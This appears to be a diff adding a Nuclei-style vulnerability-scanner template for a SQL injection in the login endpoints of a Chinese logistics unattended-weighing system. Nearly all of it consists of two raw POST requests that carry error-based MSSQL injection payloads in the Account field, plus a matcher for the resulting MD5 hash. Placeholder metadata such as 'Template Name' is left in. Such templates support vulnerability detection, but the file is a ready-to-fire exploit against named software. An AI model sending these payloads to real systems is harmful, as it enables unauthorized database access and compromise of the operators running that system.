@@ -1,0 +1,37 @@
+id: zhinengwuliu-login-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 易思智能物流无人值守系统login存在SQL注入漏洞.md
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E6%98%93%E6%80%9D%E6%99%BA%E8%83%BD%E7%89%A9%E6%B5%81%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E7%B3%BB%E7%BB%9F/%E6%98%93%E6%80%9D%E6%99%BA%E8%83%BD%E7%89%A9%E6%B5%81%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E7%B3%BB%E7%BB%9Flogin%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /api/PhoneLogin/login HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip
+
+        Account=1'%20and%20sys.fn_sqlvarbasetostr(HashBytes('MD5','1'))=1--&Espassword=g5edid4OCFI32C5NPEZeXg%3D%3D
+      - |-
+        POST /api/SingleLogin/login HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
+        Accept: application/json, text/javascript, */*; q=0.01
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Content-Type: application/x-www-form-urlencoded; charset=utf-8
+        Priority: u=0
+        X-Requested-With: XMLHttpRequest
+        Accept-Encoding: gzip, deflate
+        Content-Length: 212
+
+        LoginUserType=0&DeviceType=2&Account=1'%20and%20sys.fn_sqlvarbasetostr(HashBytes('MD5','123'))=1--&BrowserType=Firefox&Verifycode=&IMEI=&isverify=false&SetOfBooks=Default&Espassword=1wD%2Bj6eIbahZGOatg1Spiw%3D%3D
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'c4ca4238a0b923820dcc509a6f75849b'
